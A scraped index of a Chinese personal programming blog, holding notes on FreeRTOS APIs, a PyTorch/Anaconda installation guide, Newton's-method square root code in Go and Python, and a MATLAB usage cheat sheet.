信号量句柄，必须是由xSemaphoreCreateRecursiveMutex()创建的信号量 xTickToWait 信号量无效时，任务最多等待的时间，单位是系统节拍周期个数 返回值 意义 pdTRUE 成功获取到信号量 pdFALSE 信号量获取失败 xSemaphoreGiveRecursive 释放递归互斥量\n1 BaseType_t xSemaphoreGiveRecursive(SemaphoreHandle_t xMutex ); 参数 功能 xMutex 信号量句柄，必须由xSemaphoreCreateRecursiveMutex()创建的信号量 返回值 意义 pdTRUE 成功释放信号量 pdFALSE 信号量释放失败 vSemaphoreDelete 删除信号量\n1 void vSemaphoreDelete( SemaphoreHandle_t xSemaphore ); Queue - 队列 队列是一种数据结构，可以包含一组固定大小的数据。在创建队列的同时，队列的长度和所包含数据类型的大小就确认下来了。一个队列可以有多个写入数据的任务和多个读取数据的任务。当一个任务试图从队列读取数据的时候，它可以设置一个阻塞时间（block time）。这是当队列数据为空时，任务会进入阻塞状态的时间。当有数据在队列或者到达阻塞时间的时候，任务都会进入就绪状态。如果有多个任务同时在阻塞状态等待队列数据，优先级高的任务会在数据到达时进入就绪状态；在优先级相同的时候，等待时间长的任务会进入就绪状态。同理可以推及多个任务写入数据时候的运行状态。\nxQueueCreate 创建一个队列，为队列动态分配所需的内存空间。\n1 2 3 4 QueueHandle_t xQueueCreate( UBaseType_t uxQueueLength, UBaseType_t uxItemSize ); 参数 功能 uxQueueLength 队列能够存储的最大单元数目，即队列深度 uxItemSize 队列中数据单元的长度，以字节为单位 xQueueSend 向队列尾部发送一个队列消息。消息以拷贝的形式入队，而不是以引用的形式。\n1 2 3 4 5 BaseType_t xQueueSend( QueueHandle_t xQueue, const void * pvItemToQueue, TickType_t xTicksToWait ); 参数 功能 xQueue 目标队列的句柄。这个句柄即是调用 xQueueCreate() 创建该队列时的返回值 pvItemToQueue 发送数据的指针。其指向将要复制到目标队列中的数据单元。由于在创建队列时设置了队列中数据单元的长度，所以会从该指针指向的空间复制对应长度的数据到队列的存储区域 xTicksToWait 队列满时，等待队列空闲的最大超时时间。如果队列满并且 xTicksToWait 被设置成 0，函数立刻返回 返回值 意义 pdTRUE 消息发送成功成功 pdFALSE 消息发送成功失败 xQueueReceive 从一个队列中接收消息并把消息从队列中删除。接收的消息是以拷贝的形式进行的，所以必须提供一个足够大空间的缓冲区。具体能够拷贝多少数据到缓冲区，这个在队列创建的时候已经设定。\n1 2 3 4 5 BaseType_t xQueueReceive( QueueHandle_t xQueue, void *pvBuffer, TickType_t xTicksToWait ); 参数 功能 xQueue 被读队列的句柄。这个句柄即是调用 xQueueCreate() 创建该队列时的返回值 pvBuffer 接收缓存指针。其指向一段内存区域，用于接收从队列中拷贝来的数据 xTicksToWait 队列空时，阻塞超时的最大时间。如果该参数设置为 0，函数立刻返回 返回值 意义 pdTRUE 队列项接收成功 pdFALSE 队列项接收失败 Stream Buffer - 流缓冲区 使用Stream Buffer 对流媒体数据，在任务间进行传输流媒体，读和写的大小都没有任何的限制，读和写的大小可以不一致， 比如写入100 bytes, 可以分成两次每次50 bytes读取出来。\n适合于一个任务写，另外一个任务读，并不适合多任务读写（当然你也可以使用MUTEX）。\nxStreamBufferCreate 创建流缓冲区\n1 2 3 4 StreamBufferHandle_t xStreamBufferCreate( size_t xBufferSizeBytes, size_t xTriggerLevelBytes ); 参数 功能 xBufferSizeBytes 流缓冲区在任何时候都能够保存的总字节数 xTriggerLevelBytes 在流缓冲区上阻塞以等待数据的任务移出阻塞状态之前，流缓冲区中必须包含的字节数 xStreamBufferSend 将字节发送到流缓冲区\n1 2 3 4 5 6 size_t xStreamBufferSend( StreamBufferHandle_t xStreamBuffer, const void * pvTxData, size_t xDataLengthBytes, TickType_t xTicksToWait ); 参数 功能 xStreamBuffer 正在向其发送流的流缓冲区的句柄 pvTxData 指向缓冲区的指针，该缓冲区保存要复制到流缓冲区中的字节 xDataLengthBytes 从pvTxData复制到流缓冲区的最大字节数 xTicksToWait 如果流缓冲区包含的空间太小而无法容纳另一个xDataLengthBytes字节，则任务应保持在阻塞状态以等待流缓冲区中有足够空间可用的最长时间 返回写入流缓冲区的字节数。如果一个任务超时，它可以将所有xDataLengthBytes写入缓冲区，它仍将写入尽可能多的字节。\nxStreamBufferReceive 从流缓冲区接收字节\n1 2 3 4 5 6 size_t xStreamBufferReceive( StreamBufferHandle_t xStreamBuffer, void * pvRxData, size_t xBufferLengthBytes, TickType_t xTicksToWait ); 参数 功能 xStreamBuffer 要从中接收字节的流缓冲区的句柄 pvRxData 指向将要复制接收字节的缓冲区的指针 xBufferLengthBytes pvRxData参数指向的缓冲区长度。这设置了一次调用中要接收的最大字节数。 xStreamBufferReceive将返回尽可能多的字节，直到xBufferLengthBytes设置的最大值 xTicksToWait 如果流缓冲区为空，任务应保持在阻塞状态以等待数据变为可用的最长时间 返回实际从流缓冲区读取的字节数，如果在xBufferLengthBytes可用之前对xStreamBufferReceive()的调用超时，则该字节数将小于xBufferLengthBytes。\nxStreamBufferIsFull 查询流缓冲区以查看它是否已满。 如果流缓冲区没有任何可用空间，则它已满，因此无法再接受任何数据。\n1 BaseType_t xStreamBufferIsFull(StreamBufferHandle_t xStreamBuffer); 参数 功能 xStreamBuffer 正在查询的查询流缓冲区的句柄 返回值 意义 pdTRUE 流缓冲区已满 pdFALSE 流缓冲区未满 xStreamBufferBytesAvailable 查询流缓冲区以查看它包含多少数据，这等于在流缓冲区为空之前可以从流缓冲区读取的字节数。\n1 size_t xStreamBufferBytesAvailable(StreamBufferHandle_t xStreamBuffer); 参数 功能 xStreamBuffer 正在查询的查询流缓冲区的句柄 返回在查询流缓冲区为空之前可以从查询流缓冲区读取的字节数，即包含多少数据。\nxStreamBufferSpacesAvailable 查询流缓冲区以查看它包含多少可用空间，这等于在流缓冲区满之前可以发送到流缓冲区的数据量。\n1 size_t xStreamBufferSpacesAvailable(StreamBufferHandle_t xStreamBuffer); 参数 功能 xStreamBuffer 正在查询的查询流缓冲区的句柄 返回在流缓冲区满之前可以写入流缓冲区的字节数。\nMessage Buffer - 消息缓冲区 Message Buffer基于Stream Buffer实现, 在传输的时候使用4个字节记录了发送内容大小，这样在读取时，也可以一次读取对应大小的数据，所以很适合串口接收和发送数据，每次的大小不定，但是接受和发送的数据量需要相同。\nxMessageBufferCreate 创建消息缓冲区\n1 MessageBufferHandle_t xMessageBufferCreate(size_t xBufferSizeBytes); 参数 功能 xBufferSizeBytes 消息缓冲区在任何时候都能保存的总字节数（而不是消息）。当消息写入消息缓冲区时，还会写入另外的sizeof（size_t）字节来存储消息的长度 xMessageBufferSend 将离散消息发送到消息缓冲区。消息可以是适合缓冲区可用空间的任何长度，并被复制到缓冲区中。\n1 2 3 4 5 size_t xMessageBufferSend( MessageBufferHandle_t xMessageBuffer, const void * pvTxData, size_t xDataLengthBytes, TickType_t xTicksToWait); 参数 功能 xMessageBuffer 正在向其发送消息的消息缓冲区的句柄 pvTxData 指向要复制到消息缓冲区中的消息的指针 xDataLengthBytes 消息的长度 xTicksToWait 如果消息缓冲区空间不足，则调用任务应保持在阻塞状态以等待消息缓冲区中有足够空间可用的最长时间 返回写入消息缓冲区的字节数。如果在有足够的空间将消息写入消息缓冲区之前对xMessageBufferSend()的调用超时，则返回零。如果调用没有超时，则返回xDataLengthBytes。\nxMessageBufferReceive 从消息缓冲区接收离散消息。消息可以是可变长度的，并从缓冲区中复制出来。\n1 2 3 4 5 6 size_t xMessageBufferReceive( MessageBufferHandle_t xMessageBuffer, void * pvRxData, size_t xMessageSizeMax, TickType_t xTicksToWait ); 参数 功能 xMessageBuffer 从中接收消息的消息缓冲区的句柄 pvRxData 指向要将复制的消息复制到的缓冲区的指针 xMessageSizeMax 获取消息的最大长度 xTicksToWait 如果消息缓冲区为空，则任务应保持在阻塞状态以等待消息的最长时间 返回从消息缓冲区读取的消息的长度（以字节为单位）（如果有）。如果xMessageBufferReceive()在消息可用之前超时，则返回零。如果消息的长度大于xBufferLengthBytes，则消息将保留在消息缓冲区中并返回零。\nxMessageBufferIsFull 查询消息缓冲区以查看它是否已满\n1 BaseType_t xMessageBufferIsFull(MessageBufferHandle_t xMessageBuffer); 参数 功能 xMessageBuffer 正在查询的消息缓冲区的句柄 返回值 意义 pdTRUE 消息缓冲区已满 pdFALSE 消息缓冲区未满 Direct Task Notification - 直接任务通知 Direct Task Notification是FreeRTOS 10版本以后的最重要的一个功能。可以实现二进制信号量、计数信号量、事件组、邮箱等功能，而且速度快45%，占用更少的内存。\n一个任务可以有多个notification 每个notification包含4个字节的value 和 1个字节的stats stats用来记录当前的notification有没有被处理 pending or not pending 我们不能对stats进行直接的读写操作，是系统自动的 我们只能对notification value 进行操作 xTaskNotify 向一个任务发送通知\n1 2 3 4 5 BaseType_t xTaskNotify( TaskHandle_t xTaskToNotify, uint32_t ulValue， eNotifyAction eAction ); 参数 功能 xTaskToNotify 被通知任务的句柄 ulValue 通知的操作值 eAction 通知的操作方法 eNotifyAction 作用 eIncrement 累加 eNoAction 什么也不做 eSetBits 按位取与，实现设置某一位值为1 eSetValueWithOverwrite 覆盖 eSetValueWithoutOverwrite 如果前一个通知已处理则覆盖 返回值 意义 pdTRUE 直接任务通知成功 pdFALSE 直接任务通知失败 xTaskNotifyWait 等待一个通知\n1 2 3 4 5 6 BaseType_t xTaskNotifyWait( uint32_t ulBitsToClearOnEntry, uint32_t ulBitsToClearOnExit, uint32_t *pulNotificationValue, TickType_t xTicksToWait ); 参数 功能 ulBitsToClearOnEntry 接收通知前value区保存的内容，一般为0x00 ulBitsToClearOnExit 接收通知后value区保存的内容，一般为0x00或ULONG_MAX pulNotificationValue 产生通知时，value区转存的缓冲区，用于接收通知的内容 xTicksToWait 在没有通知时最大的等待时间 返回值 意义 pdTRUE 等待通知成功 pdFALSE 等待通知失败 常用公共API 接下来的一部分可能得等到我想到再填了（恼）\n后记 这次的笔记真的很长呢，资料也东拼西凑了很多，虽然大部分我都亲自试验过了，但难免笔记中存在一些问题和谬误，如果您发现了这些问题，请及时在下方评论区中提出，我会第一时间更改，谢谢大家了。\n","permalink":"https://www.papernote.cn/posts/2022-07-22-freertos%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-api%E8%A7%84%E8%8C%83%E8%AE%B0%E5%BD%95/","summary":"❗ 注意\n文章内容较长且多为字典用途，请结合上面的目录使用。\nAyala看b站UP主孤独的二进制的FreeRTOS教学视频有感，打算对视频内容进行一些总结和归纳，方便以后的使用，遂有此篇。\n为什么要使用RTOS （Real-Time Operating System,RTOS）即实时操作系统，通常应用于嵌入式等对实时性要求较高的产品中，它会按照排序运行、管理系统资源，并为开发应用程序提供一致的基础。 实时操作系统与一般的操作系统相比，最大的特色就是“实时性”，如果有一个任务需要执行，实时操作系统会马上（在较短时间内）执行该任务，不会有较长的延时。这种特性保证了各个任务的及时执行。\nFreeRTOS与Arduino框架的区别 在ESP32平台上，Arduino是运行在RTOS上的一个任务（Task），分为设置代码setup()和基础循环loop()，其在RTOS中的表示大概是这样的：\n1 2 3 4 5 6 7 8 9 10 11 void task_arduino(void* ptParam) { setup() for (;;) { loop() } } void app_main() { xTaskCreatePinnedToCore(task_arduino,\u0026#34;arduino\u0026#34;,1024*128,NULL,1,NULL,1) // 以上一条代码不需要管 } 而一个标准的Arduino的程序看起来是这样的：\n1 2 3 4 5 6 void setup() { ... } void loop() { ... } 使用Arduino-ESP32这个库会将上述代码代入前一个代码，所以即便你可能用的是ArduinoIDE，但是实际上仍会被翻译成ESP-IDF项目，所以你可以在你的Arduino-ESP32项目中使用FreeRTOS。\nFreeRTOS有什么API需要注意 💬 引用：\nb站 孤独的二进制：有相当部分的内容来自于此\nESP32文档和FreeRTOS的文档翻译：函数原型、参数、返回值等的描述\n可能还有一些没标注到的，请在评论区联系我。\n创建、删除任务，任务绑定核心 xTaskCreate 创建任务\n1 2 3 4 5 6 7 8 BaseType_t xTaskCreate( TaskFunction_t pvTaskCode, const char * const pcName, configSTACK_DEPTH_TYPE usStackDepth, void *pvParameters, UBaseType_t uxPriority, TaskHandle_t *pxCreatedTask ); 参数 功能 注意点 pvTaskCode 任务函数 传入一个函数指针，函数需要一个空类型指针作为参数 pcName 任务名 传入一个字符串 usStackDepth 任务栈大小 即内存空间，一般的写法为1024*n（n为任务需求的内存大小） pvParameters 任务参数 使用空类型指针，可以传结构体指针，只要前面加上(void *)进行强制类型转换，但是在任务内部仍需转换回来 uxPriority 任务优先级 一般是0-24，24为最高优先级，如果高优先级任务不block或者暂停，那么低优先级任务永不执行 pxCreatedTask 任务句柄 用于控制这个任务，比如删除、暂停、设置优先级等 返回值 意义 pdPass 表示任务已经创建成功 errCOULD_NOT_ALLOCATE_REQUIRED_MEMORY 表示无法创建任务，因为FreeRTOS没有足够的堆内存来分配任务数据结构和堆栈 xTaskCreatePinnedToCore 在指定核心上创建任务。","title":"FreeRTOS学习笔记 - API规范记录"},{"content":" ❗ 注意\n这篇文章有部分尚未完成。\n先看网址 PyTorch https://pytorch.org/ Anaconda https://www.anaconda.com/ PyCharm （可选） https://www.jetbrains.com/pycharm/ 本站不提供镜像\n安装思路 Anaconda是一个Python发行版，使用Anaconda做环境分隔可以解决很多环境干扰问题（不搞base环境的话基本上没啥大问题），我们将在Anaconda创建一个虚拟环境，然后在这个虚拟环境上安装PyTorch，并测试这个PyTorch环境。\n安装步骤 step 1 下载并安装Anaconda 打开Anaconda网站，并点击“Download”， 可能会下的有点慢，可以选择使用迅雷加速\n下载完成后双击安装包安装 接下来一路Next-\u0026gt;I Agree-\u0026gt;Next-\u0026gt;Next ▲ 应该没人用多用户吧（比如跑在服务器上 接下来这一步有两个选项，不够我在这里给个小建议，当然你们也可以根据实际情况自己选择：\n当你电脑里没有Python：建议全选 当你电脑里有python,但版本号与选项2给出的版本不一致：建议全选 当你电脑里有Python，但版本号与选项2给出的版本一致：建议只选第一项 当然你可以都不选(建议电脑里面没有预先安装的Python)，在后期自己添加环境变量（详见教程ep 1，请记住上一步的安装位置） 查看python版本号,在这里只看前两位：\n1 python -V # Python 3.9.7 选好之后点击Install,然后就是Next-\u0026gt;Next-\u0026gt;Finish\n接下来弹出一个PyCharm的广告，虽然我自己用的VS Code，不过PyCharm社区版免费，也挺好用的，何乐而不为呢？ 接下来两个勾勾都取消然后就可以Finish啦。 step 2 创建并配置conda环境 当Anaconda被正确安装之后，首先打开你的命令行软件（CMD或者PowerShell），我们需要执行conda init命令来应用环境。\n1 $ conda init 接下来我们创建一个名为torch的环境，使用Python3.9\n1 $ conda create -n torch python=3.9 使用这条指令创建的环境将只包含一些基础且必须的包（比如pip等），如果你需要额外安装其他的东西（比如numpy或者jupyter等），你需要在命令的末尾添加anaconda，这里我们并不需要这么做。 在执行过程中可能需要联网下载一些文件，速度比较慢的话请耐心等待。\n接着我们激活这个环境，当显示以下图片即意味着conda环境创建成功了\n1 $ conda activate torch 常用conda指令见ep 3\nstep 3 安装PyTorch 写作规划 (该部分尚未完成) 区分显卡类型\nN卡找cuda版本号\n在PyTorch官网寻找合适的版本获取指令\n在指定环境执行指令\nstep 4 在VSCode测试PyTorch的安装情况 写作规划 (该部分尚未完成) 设置python解释器\n代码\n调试执行\n结果\nep 1 手动设置Anaconda ❗ 注意\n该部分不是新手教程，在执行这一步骤前，你需要知道你的Anaconda安装位置\n假如我的Anaconda安装在C:\\ProgramData\\Anaconda3下，这个时候我们按win键，然后直接输入并搜索\u0026quot;编辑系统环境变量\u0026quot;，点击控制面板项。 让后我们点击右下角的\u0026quot;环境变量\u0026quot;选项 我们在\u0026quot;系统变量\u0026quot;中找到\u0026quot;Path\u0026quot;变量，点击编辑 这个时候我们添加以下三项：\n1 2 3 C:\\ProgramData\\Anaconda3 # 这是你刚才记下的位置 C:\\ProgramData\\Anaconda3\\Scripts # 这是你刚才记下的位置的一个子目录 C:\\ProgramData\\Anaconda3\\Library\\bin # 注意改变前面的位置 最后我们打开一个命令行窗口，输入以下命令测试conda是否被正确安装：\n1 $ conda --version # conda 4.12.0 常用conda指令见ep 3\nep 2 pip换源 pip安装包比较慢想换源？\n这里我安利一个快捷换源方法：pqi\n打开你的命令行终端，输入以下指令即可快捷切换至tuna源：\n1 2 $ pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ pqi $ pqi use tuna 当然pqi的用法还可以在研究研究\u0026hellip;.\nep 3 常用的conda命令 基本指令 conda list 查看当前环境安装了哪些包。 conda info \u0026ndash;env 查看当前都有哪些虚拟环境 conda update conda 更新conda conda \u0026ndash;version 查询conda版本 conda -h 查询conda命令帮助 创建或删除环境 1 2 3 $ conda create -n \u0026lt;env_name\u0026gt; python=X.X # 创建python版本为X.X、名字为\u0026lt;env_name\u0026gt;的虚拟环境 $ conda create -n \u0026lt;env_name\u0026gt; python=X.X anaconda # 创建python版本为X.X、名字为\u0026lt;env_name\u0026gt;的虚拟环境，附带常用包 $ conda remove -n \u0026lt;env_name\u0026gt; --all # 删除名为\u0026lt;env_name\u0026gt;的环境及环境下所有的包 激活或退出环境 1 2 $ conda activate \u0026lt;env_name\u0026gt; # 激活名为\u0026lt;env_name\u0026gt;的环境 $ conda deactivate # 退出到base环境 包管理 1 2 $ conda install -n \u0026lt;env_name\u0026gt; \u0026lt;package_name\u0026gt; # 在\u0026lt;env_name\u0026gt;环境内安装名为\u0026lt;package_name\u0026gt;的包 $ conda remove --name \u0026lt;env_name\u0026gt; \u0026lt;package_name\u0026gt; # 卸载在\u0026lt;env_name\u0026gt;环境内名为\u0026lt;package_name\u0026gt;的包 ","permalink":"https://www.papernote.cn/posts/2022-04-16-pytorch%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%89%E8%A3%85anaconda-pytorch/","summary":"❗ 注意\n这篇文章有部分尚未完成。\n先看网址 PyTorch https://pytorch.org/ Anaconda https://www.anaconda.com/ PyCharm （可选） https://www.jetbrains.com/pycharm/ 本站不提供镜像\n安装思路 Anaconda是一个Python发行版，使用Anaconda做环境分隔可以解决很多环境干扰问题（不搞base环境的话基本上没啥大问题），我们将在Anaconda创建一个虚拟环境，然后在这个虚拟环境上安装PyTorch，并测试这个PyTorch环境。\n安装步骤 step 1 下载并安装Anaconda 打开Anaconda网站，并点击“Download”， 可能会下的有点慢，可以选择使用迅雷加速\n下载完成后双击安装包安装 接下来一路Next-\u0026gt;I Agree-\u0026gt;Next-\u0026gt;Next ▲ 应该没人用多用户吧（比如跑在服务器上 接下来这一步有两个选项，不够我在这里给个小建议，当然你们也可以根据实际情况自己选择：\n当你电脑里没有Python：建议全选 当你电脑里有python,但版本号与选项2给出的版本不一致：建议全选 当你电脑里有Python，但版本号与选项2给出的版本一致：建议只选第一项 当然你可以都不选(建议电脑里面没有预先安装的Python)，在后期自己添加环境变量（详见教程ep 1，请记住上一步的安装位置） 查看python版本号,在这里只看前两位：\n1 python -V # Python 3.9.7 选好之后点击Install,然后就是Next-\u0026gt;Next-\u0026gt;Finish\n接下来弹出一个PyCharm的广告，虽然我自己用的VS Code，不过PyCharm社区版免费，也挺好用的，何乐而不为呢？ 接下来两个勾勾都取消然后就可以Finish啦。 step 2 创建并配置conda环境 当Anaconda被正确安装之后，首先打开你的命令行软件（CMD或者PowerShell），我们需要执行conda init命令来应用环境。\n1 $ conda init 接下来我们创建一个名为torch的环境，使用Python3.9\n1 $ conda create -n torch python=3.9 使用这条指令创建的环境将只包含一些基础且必须的包（比如pip等），如果你需要额外安装其他的东西（比如numpy或者jupyter等），你需要在命令的末尾添加anaconda，这里我们并不需要这么做。 在执行过程中可能需要联网下载一些文件，速度比较慢的话请耐心等待。\n接着我们激活这个环境，当显示以下图片即意味着conda环境创建成功了\n1 $ conda activate torch 常用conda指令见ep 3","title":"Pytorch学习笔记 - 安装Anaconda\u0026PyTorch"},{"content":"1.思路 给定一个数x，求解x的开方，取半值逐渐逼近。\nGoLang 1 2 3 4 5 6 7 func Sqrt(x float64) float64 { z := x / 2 // 猜测值 for i := 0; i \u0026lt; 10; i++ { z -= (z*z - x) / (2 * z) // 逐渐逼近 } return z } Python 1 2 3 4 5 def Sqrt(x: float) -\u0026gt; float: z = x/2 for i in range(10): z -= (z*z - x)/(2 * z) return z ","permalink":"https://www.papernote.cn/posts/2021-10-12-%E5%88%A9%E7%94%A8%E7%89%9B%E9%A1%BF%E6%B3%95%E6%B1%82%E8%A7%A3%E5%BC%80%E6%96%B9-copy/","summary":"1.思路 给定一个数x，求解x的开方，取半值逐渐逼近。\nGoLang 1 2 3 4 5 6 7 func Sqrt(x float64) float64 { z := x / 2 // 猜测值 for i := 0; i \u0026lt; 10; i++ { z -= (z*z - x) / (2 * z) // 逐渐逼近 } return z } Python 1 2 3 4 5 def Sqrt(x: float) -\u0026gt; float: z = x/2 for i in range(10): z -= (z*z - x)/(2 * z) return z ","title":"利用牛顿法求解开方"},{"content":"基本 变量域与格式 清理工作区变量：clear、清理命令行窗口：clc。\n调整输出格式：\n1 format [style] 其中style有：\nstyle 描述 rat 以分数形式输出 compact 以紧凑型格式输出 short 以四位小数输出 long 输出较长的小数位 shortEng 以科学计数法输出较短小数 longEng 以科学计数法输出较长小数 hex 以 16 进制数输出 输入输出 函数名 用法示例 描述 disp() disp(String) 显示一段文字 fprintf() fprintf(formated string{,data}) 格式输出（字面意思） print() print(Target,data) 向Target展示data（不常用） 逻辑运算 判断语句：\n1 2 3 4 5 6 7 if (条件语句) 运算式 elseif (条件语句2) 运算式2 else 运算式3 end for 循环：\n1 2 3 4 5 6 7 8 for 变数 = 矩阵 运算式 end % 等差数列 for i = 1:6 disp(i) % 逐行输出 1 2 3 4 5 6 end while 循环：\n1 2 3 while 条件式 运算式 end 代数式运算 代数式求解 函数名 用法示例 描述 solve() solve(equation,syms) 以syms为自变量求解方程equation的解 solve() [x,y,z] = solve(方程1,方程2,方程3,x,y,z) 将x,y,z解出 vpa() vpa(x,n) 将变量x化为小数,小数共有n位 代数式优化 函数名 用法示例 描述 floor() floor([ ] or num) 向下取整 simplify() simplify(Algebraic expression) 化简代数式 subs() subs(f,[a b],[c d]) 将符号表达式f中的a,b代换为c,d exp() exp(x) 获得e的x次方 多项式曲线拟合 polyfit是多项式曲线拟合函数，polyval是多项式计算求值函数\n函数名 用法示例 描述 polyfit() polyfit(x,y,m) x,y表示横纵坐标向量，代表多项式系数 polyval() y0 = polyval(p,x0) 求多项式在x0处的取值，x0可以是向量。p为多项式的系数由高到低排列组成的向量，如y=3x^2+5x+4的p为[3,5,4] 高等数学 微分 diff 函数用以演算一函数的微分项，相关的函数语法有下列 4 个：\ndiff(f) 传回 f 对预设独立变数的一次微分值 diff(f,\u0026rsquo;t') 传回 f 对独立变数 t 的一次微分值 diff(f,n) 传回 f 对预设独立变数的 n 次微分值 diff(f,\u0026rsquo;t\u0026rsquo;,n) 传回 f 对独立变数 t 的 n 次微分值 数值微分函数也是用 diff，因此这个函数是靠输入的引数决定是以数值或是符号微分，假设引数为向量则运行数值微分，假设引数为符号表示式则运行符号微分。\n先定义下列三个方程式，接著再演算其微分项：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026gt;\u0026gt;S1 = \u0026#39;6*x^3-4*x^2+b*x-5\u0026#39;; \u0026gt;\u0026gt;S2 = \u0026#39;sin(a)\u0026#39;; \u0026gt;\u0026gt;S3 = \u0026#39;(1 - t^3)/(1 + t^4)\u0026#39;; \u0026gt;\u0026gt;diff(S1) ans=18*x^2-8*x+b \u0026gt;\u0026gt;diff(S1,2) ans= 36*x-8 \u0026gt;\u0026gt;diff(S1,\u0026#39;b\u0026#39;) ans= x \u0026gt;\u0026gt;diff(S2) ans= cos(a) \u0026gt;\u0026gt;diff(S3) ans=-3*t^2/(1+t^4)-4*(1-t^3)/(1+t^4)^2*t^3 \u0026gt;\u0026gt;simplify(diff(S3)) ans= t^2*(-3+t^4-4*t)/(1+t^4)^2 极限 limit()用于计算所给函数的极限具体用法如下：\n函数名 用法示例 描述 limit() limit(f,x,a,\u0026rsquo;left') 可给出函数f关于x-\u0026gt;a时极限，\u0026rsquo;left\u0026rsquo;为左趋于a，\u0026lsquo;right\u0026rsquo;表示右趋于a 示范样例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 syms x a b f=x*(1-2*a/x)^x*sin(3*b/x); L=limit(f,x,inf) syms x f=sin(x); L1=limit(f,x,pi/2,\u0026#39;left\u0026#39;) L2=limit(f,x,pi/2,\u0026#39;right\u0026#39;) syms y n x f=(x^(1/n)+y^(1/n))/(x+y); limit(f,x,y) 多变量函数极限 多变量函数可嵌套limit函数使用\n如求f(x,y)在x-\u0026gt;x0,y-\u0026gt;y0是的极限\n1 2 3 4 5 6 7 8 syms x y f=x+y; L=limit(limit(f,x,1),y,1) L = 2 积分 int 函数用以演算一函数的积分项， 这个函数要找出一符号式 F 使得 diff(F)=f。假设积分式的解析式(analytical form, closed form) 不存在的话或是 MATLAB 无法找到，则 int 传回原输入的符号式。相关的函数语法有下列 4 个：\nint(f) 传回 f 对预设独立变数的积分值 int(f,\u0026rsquo;t\u0026rsquo;) 传回 f 对独立变数 t 的积分值 int(f,a,b) 传回 f 对预设独立变数的积分值，积分区间为[a,b]，a 和 b 为数值式 int(f,\u0026rsquo;t\u0026rsquo;,a,b) 传回 f 对独立变数 t 的积分值，积分区间为[a,b]，a 和 b 为数值式 int(f,\u0026rsquo;m\u0026rsquo;,\u0026rsquo;n') 传回 f 对预设变数的积分值，积分区间为[m,n]，m 和 n 为符号式 我们示范几个样例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026gt;\u0026gt;S1 = \u0026#39;6*x^3-4*x^2+b*x-5\u0026#39;; \u0026gt;\u0026gt;S2 = \u0026#39;sin(a)\u0026#39;; \u0026gt;\u0026gt;S3 = \u0026#39;sqrt(x)\u0026#39;; \u0026gt;\u0026gt;int(S1) ans= 3/2*x^4-4/3*x^3+1/2*b*x^2-5*x \u0026gt;\u0026gt;int(S2) ans= -cos(a) \u0026gt;\u0026gt;int(S3) ans= 2/3*x^(3/2) \u0026gt;\u0026gt;int(S3,\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;) ans= 2/3*b^(3/2)- 2/3*a^(3/2) \u0026gt;\u0026gt;int(S3,0.5,0.6) ans= 2/25*15^(1/2)-1/6*2^(1/2) \u0026gt;\u0026gt;numeric(int(S3,0.5,0.6)) % 使用numeric函数能够计算积分的数值 ans= 0.0741 二重积分 可使用int()函数嵌套来求解二重积分\n1 2 3 f=exp(-t*x); int(int(f,t)+c1,x)+c2 常微分方程式 MATLAB 解常微分方程式的语法是 dsolve(\u0026rsquo;equation\u0026rsquo;,\u0026lsquo;condition\u0026rsquo;)，当中 equation 代表常微分方程式即 y\u0026rsquo;=g(x,y)，且须以 Dy 代表一阶微分项 y\u0026rsquo;　D2y 代表二阶微分项 y\u0026rsquo;\u0026rsquo;，condition 则为初始条件。\n如果有下面三个一阶常微分方程式和其初始条件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 y\u0026#39;=3x2, y(2)=0.5 y\u0026#39;=2.x.cos(y)2, y(0)=0.25 y\u0026#39;=3y+exp(2x), y(0)=3 相应上述常微分方程式的符号运算式为： \u0026gt;\u0026gt;soln_1 = dsolve(\u0026#39;Dy =3*x^2\u0026#39;,\u0026#39;y(2)=0.5\u0026#39;) ans= x^3-7.500000000000000 \u0026gt;\u0026gt;ezplot(soln_1,[2,4]) % 看看这个函数的长相 \u0026gt;\u0026gt;soln_2 = dsolve(\u0026#39;Dy =2*x*cos(y)^2\u0026#39;,\u0026#39;y(0) = pi/4\u0026#39;) ans= atan(x^2+1) \u0026gt;\u0026gt;soln_3 = dsolve(\u0026#39;Dy = 3*y +exp(2*x)\u0026#39;,\u0026#39; y(0) = 3\u0026#39;) ans= -exp(2*x)+4*exp(3*x) 级数展开 待补充\n矩阵运算 矩阵生成 函数名 用法示例 描述 eye() eye(n) 生成一个n阶单位矩阵 ones() ones(x,y) 生成一个 x*y 的全1矩阵 zeros() zero(x,y) 生成一个 x*y 全0矩阵 diag() diag([ ]) 根据行矩阵生成对角矩阵 rand() rand(x,y) 生成一个 x*y 的随机矩阵，矩阵元素在 0-1 之间 vander() vander([ ]) 生成一个范德蒙德矩阵 矩阵变换 函数名 用法示例 描述 rot90() rot([ ]{,k}) 将一个矩阵逆时针旋转 90 度,k 默认为 1，表示旋转 k 次 fliplr() fliplr([ ]) 将一个矩阵左右翻转 flipud() flipud([ ]) 将一个矩阵上下翻转 常规运算 函数名 用法示例 描述 det() det([ ]) 求行列式的值 [ ]\u0026rsquo; 求矩阵的转置矩阵 inv() inv([ ]) or []^-1 求矩阵的逆 rank() rank([ ]) 求矩阵的秩 sum() sum([ ]{,k= 1 or 2}) 求行矩阵的和或是矩阵的纵向和，k 默认为 1，当 k=2 时求横向和 mean() mean(x) 求x的平均值 sum() sum(x,\u0026lsquo;a\u0026rsquo;) 对x的行或列求和 特征提取 函数名 用法示例 描述 size() size([ ]{，k = 1, 2, null}) 求矩阵的大小，k=1 时取矩阵的行数，k=2 时取矩阵的列数，k 不取是返回 [行数，列数] 矩阵求解 函数名 用法示例 描述 rref() rref([ ]) 求行最简矩阵，返回行最简矩阵 or [行最简矩阵,极大无关组所在的列] linsolve() linsolve([A],[B]) 求解 A*x=B 线性方程组的特解 null() null([A]{, \u0026lsquo;r\u0026rsquo;} 求解的齐次线性方程组A*x=[0]的基础解系，一般情况下'r'是加上的 函数绘图 一元函数绘图 函数名 用法示例 描述 explot() explot(f,[xmin,xmax,ymin,ymax]) 绘制f函数x从min到max的函数图像，范围y从min到max explot(x,y,[tmin,tmax]) 